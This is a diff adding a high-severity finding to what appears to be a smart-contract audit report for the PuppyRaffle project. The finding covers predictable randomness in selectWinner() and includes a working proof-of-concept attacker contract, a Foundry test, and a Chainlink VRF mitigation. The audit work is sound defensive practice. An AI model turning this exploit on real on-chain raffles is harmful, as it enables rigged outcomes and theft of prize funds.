@@ -101,6 +101,101 @@ Ran 1 test for test/PuppyRaffleTest.t.sol:PuppyRaffleTest
 Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.11ms (450.22µs CPU time)
 ```
 
+[H-2] Weak randomness in `selectWinner()` is exploitable
+
+**Description**
+The contract uses randomness based on predictable elements to select the winner, and the rarity of the winners NFT. Malicious users can exploit this to predict whether they will win or not, and choose whether to call `selectWinner()` based on this.
+
+**Impact**
+This allows users to force a win by only calling `selectWinner()` when they are certain they will win.
+
+**Proof of Concept**
+The following can be placed into the `test/PuppyRaffelTest.t.sol` file.
+
+First, a contract to act as our attacker. The contract must be a ERC721Receiver as the Puppy Raffle uses safeMint:
+```
+interface IERC721Receiver {
+    function onERC721Received(
+        address operator,
+        address from,
+        uint256 tokenId,
+        bytes calldata data
+    ) external returns (bytes4);
+}
+
+contract ExploitRandomness is IERC721Receiver{
+    PuppyRaffle puppyRaffle;
+
+    constructor(address _puppyRaffle){
+        puppyRaffle = PuppyRaffle(_puppyRaffle);
+    }
+
+    fallback() external payable{}
+
+    function onERC721Received(
+        address operator,
+        address from,
+        uint256 tokenId,
+        bytes calldata data
+    ) external override returns (bytes4) {
+        return this.onERC721Received.selector;
+    }
+
+
+    function attack() public{
+        uint256 winnerIndex = uint256(keccak256(abi.encodePacked(address(this), block.timestamp, block.difficulty))) % 5; 
+
+        require(puppyRaffle.players(winnerIndex) == address(this), "You wont win");
+        puppyRaffle.selectWinner();
+    }
+}
+```
+Next, the test:
+
+```
+    function testExploitRandomness() public playersEntered{
+        vm.startPrank(vm.addr(10));
+        vm.deal(vm.addr(10), entranceFee);
+
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number);
+
+        ExploitRandomness exploitRandomness = new ExploitRandomness(address(puppyRaffle));
+        address[] memory maliciousPlayer = new address[](1);
+        maliciousPlayer[0] = address(exploitRandomness);
+        puppyRaffle.enterRaffle{value:entranceFee}(maliciousPlayer);
+
+        bool success = false;
+        uint256 attempt = 0;
+        while(!success){
+            try exploitRandomness.attack() {
+                success = true;
+                break;
+            } catch{
+                if(attempt > 100) break;
+                attempt++;
+                vm.roll(block.number+attempt);
+                vm.warp(block.timestamp+attempt);
+                vm.prevrandao(keccak256(abi.encodePacked(block.number)));
+            }
+        }
+
+        assertEq(puppyRaffle.previousWinner(), address(0), "User was able to exploit randomness!");
+    }
+```
+
+The test can be ran using `forge test --match-test testExploitRandomness`.
+
+Which results in
+```
+Failing tests:
+Encountered 1 failing test in test/PuppyRaffleTest.t.sol:PuppyRaffleTest
+[FAIL. Reason: assertion failed] testExploitRandomness() (gas: 513354)
+```
+
+**Recommended Mitigation**
+To mitigate this issue, we need to change the way we handle randomness. Instead of relying on on chain data, we should use an oracle such as [Chainlink VRF](https://docs.chain.link/vrf).
+
 [M-1] Nested loop inside `enterRaffle()` create a DoS vulnerability
 
 **Description**
